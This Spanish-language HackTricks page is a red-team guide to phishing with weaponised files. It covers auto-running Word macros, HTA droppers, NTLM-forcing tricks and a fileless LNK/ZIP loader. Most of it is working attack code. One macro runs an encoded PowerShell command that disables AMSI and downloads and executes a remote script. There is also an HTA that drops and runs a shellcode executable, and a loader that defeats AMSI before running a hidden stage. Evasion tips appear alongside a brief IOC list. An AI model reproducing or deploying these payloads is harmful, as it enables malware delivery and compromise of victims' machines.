# Phishing Archivos y Documentos

{{#include ../../banners/hacktricks-training.md}}

## Documentos de Office

Microsoft Word realiza una validación de datos del archivo antes de abrirlo. La validación de datos se efectúa en forma de identificación de la estructura de datos, contra el estándar OfficeOpenXML. Si ocurre algún error durante la identificación de la estructura de datos, el archivo analizado no se abrirá.

Normalmente, los archivos de Word que contienen macros usan la extensión `.docm`. Sin embargo, es posible renombrar el archivo cambiando la extensión y aún conservar la capacidad de ejecución de sus macros.\
Por ejemplo, un archivo RTF no soporta macros, por diseño, pero un archivo DOCM renombrado a RTF será manejado por Microsoft Word y será capaz de ejecutar macros.\
Los mismos mecanismos y estructuras internas se aplican a todo el software de la Microsoft Office Suite (Excel, PowerPoint, etc.).

Puedes usar el siguiente comando para comprobar qué extensiones van a ser ejecutadas por algunos programas de Office:
```bash
assoc | findstr /i "word excel powerp"
```
Los archivos DOCX que referencian una plantilla remota (File –Options –Add-ins –Manage: Templates –Go) que incluye macros también pueden “ejecutar” macros.

### Carga de imagen externa

Ir a: _Insert --> Quick Parts --> Field_\
_**Categorías**: Links and References, **Nombres de campo**: includePicture, y **Nombre de archivo o URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Es posible usar macros para ejecutar código arbitrario desde el documento.

#### Funciones de autoload

Cuanto más comunes sean, más probable será que el AV las detecte.

- AutoOpen()
- Document_Open()

#### Ejemplos de código de macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Eliminar metadatos manualmente

Ve a **File > Info > Inspect Document > Inspect Document**, lo que abrirá el Document Inspector. Haz clic en **Inspect** y luego en **Remove All** junto a **Document Properties and Personal Information**.

#### Extensión de documento

Al terminar, selecciona el desplegable **Save as type**, cambia el formato de **`.docx`** a **Word 97-2003 `.doc`**.\
Haz esto porque **no puedes guardar macro's inside a `.docx`** y existe un **estigma** **around** la extensión habilitada para macros **`.docm`** (p. ej., el icono en miniatura tiene un gran `!` y algunos web/email gateway las bloquean por completo). Por lo tanto, esta **legacy `.doc` extension es el mejor compromiso**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Archivos HTA

Un HTA es un programa de Windows que **combina HTML y lenguajes de scripting (como VBScript y JScript)**. Genera la interfaz de usuario y se ejecuta como una aplicación "fully trusted", sin las restricciones del modelo de seguridad de un navegador.

Un HTA se ejecuta usando **`mshta.exe`**, que normalmente está **installed** junto con **Internet Explorer**, lo que hace que **`mshta` dependant on IE**. Por lo tanto, si este ha sido desinstalado, los HTA no podrán ejecutarse.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forzar la autenticación NTLM

Hay varias formas de **forzar la autenticación NTLM "remotamente"**, por ejemplo, puedes añadir **imágenes invisibles** a correos o HTML que el usuario accederá (¿incluso HTTP MitM?). O enviar a la víctima la **dirección de archivos** que **dispararán** una **autenticación** solo por **abrir la carpeta.**

**Consulta estas ideas y más en las siguientes páginas:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

No olvides que no solo puedes robar el hash o la autenticación, sino también **realizar NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Campañas altamente efectivas entregan un ZIP que contiene dos documentos señuelo legítimos (PDF/DOCX) y un .lnk malicioso. El truco es que el loader de PowerShell real se almacena dentro de los bytes crudos del ZIP después de un marcador único, y el .lnk lo extrae y ejecuta completamente en memoria.

Flujo típico implementado por el one-liner de PowerShell en el .lnk:

1) Localizar el ZIP original en rutas comunes: Desktop, Downloads, Documents, %TEMP%, %ProgramData% y el directorio padre del directorio de trabajo actual.
2) Leer los bytes del ZIP y encontrar un marcador hardcodeado (p. ej., xFIQCV). Todo lo que siga al marcador es la carga útil de PowerShell embebida.
3) Copiar el ZIP a %ProgramData%, extraerlo allí y abrir el .docx señuelo para aparentar legitimidad.
4) Evadir AMSI para el proceso actual: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Desofuscar la siguiente etapa (p. ej., eliminar todos los caracteres #) y ejecutarla en memoria.

Ejemplo de esqueleto de PowerShell para extraer y ejecutar la etapa embebida:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notas
- La entrega a menudo abusa de subdominios PaaS reputados (p. ej., *.herokuapp.com) y puede condicionar los payloads (servir ZIPs benignos según IP/UA).
- La etapa siguiente con frecuencia descifra shellcode base64/XOR y lo ejecuta vía Reflection.Emit + VirtualAlloc para minimizar artefactos en disco.

Persistencia utilizada en la misma cadena
- COM TypeLib hijacking del Microsoft Web Browser control para que IE/Explorer o cualquier app que lo embeba vuelva a lanzar el payload automáticamente. Ver detalles y comandos listos para usar aquí:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Archivos ZIP que contienen la cadena marcador ASCII (por ejemplo, xFIQCV) añadida a los datos del archivo.
- .lnk que enumera carpetas padre/usuario para localizar el ZIP y abre un documento señuelo.
- Manipulación de AMSI vía [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Hilos de negocio de larga duración que terminan con enlaces alojados bajo dominios PaaS de confianza.

## Referencias

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
